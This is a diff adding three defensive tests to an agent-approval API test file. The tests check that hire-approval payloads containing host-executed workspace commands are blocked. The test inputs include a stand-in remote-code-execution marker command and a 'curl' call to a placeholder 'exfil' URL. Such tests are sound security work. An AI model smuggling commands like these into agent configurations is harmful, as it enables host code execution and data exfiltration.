@@ -347,4 +347,97 @@ describe("approval routes idempotent retries", () => {
       }),
     );
   });
+
+  it("blocks agent-created hire approvals that set host-executed workspace commands", async () => {
+    mockSecretService.normalizeHireApprovalPayloadForPersistence.mockImplementation(async (_companyId, payload) => payload);
+
+    const res = await request(await createAgentApp())
+      .post("/api/companies/company-1/approvals")
+      .send({
+        type: "hire_agent",
+        payload: {
+          name: "Danger Agent",
+          adapterConfig: {
+            workspaceStrategy: {
+              type: "git_worktree",
+              provisionCommand: "touch /tmp/paperclip-rce",
+            },
+          },
+        },
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain("payload.adapterConfig.workspaceStrategy.provisionCommand");
+    expect(mockApprovalService.create).not.toHaveBeenCalled();
+  });
+
+  it("blocks agent resubmissions that set hire approval model-profile workspace commands", async () => {
+    mockApprovalService.getById.mockResolvedValue({
+      id: "approval-7",
+      companyId: "company-1",
+      type: "hire_agent",
+      status: "revision_requested",
+      requestedByAgentId: "agent-1",
+      payload: {},
+    });
+    mockSecretService.normalizeHireApprovalPayloadForPersistence.mockImplementation(async (_companyId, payload) => payload);
+
+    const res = await request(await createAgentApp())
+      .post("/api/approvals/approval-7/resubmit")
+      .send({
+        payload: {
+          runtimeConfig: {
+            modelProfiles: {
+              cheap: {
+                adapterConfig: {
+                  workspaceRuntime: {
+                    services: [
+                      { name: "preview", command: "curl https://example.invalid/exfil" },
+                    ],
+                  },
+                },
+              },
+            },
+          },
+        },
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain(
+      "payload.runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceRuntime.services[0].command",
+    );
+    expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
+  });
+
+  it("blocks board approval of agent-requested hire approvals with stored workspace commands", async () => {
+    mockApprovalService.getById.mockResolvedValue({
+      id: "approval-8",
+      companyId: "company-1",
+      type: "hire_agent",
+      status: "pending",
+      requestedByAgentId: "agent-1",
+      payload: {
+        requestedConfigurationSnapshot: {
+          adapterConfig: {
+            workspaceRuntime: {
+              jobs: [{ name: "seed", command: "pnpm db:seed" }],
+            },
+          },
+        },
+      },
+    });
+
+    const res = await request(await createApp())
+      .post("/api/approvals/approval-8/approve")
+      .send({ decisionNote: "ship it" });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain(
+      "payload.requestedConfigurationSnapshot.adapterConfig.workspaceRuntime.jobs[0].command",
+    );
+    expect(mockApprovalService.approve).not.toHaveBeenCalled();
+  });
 });
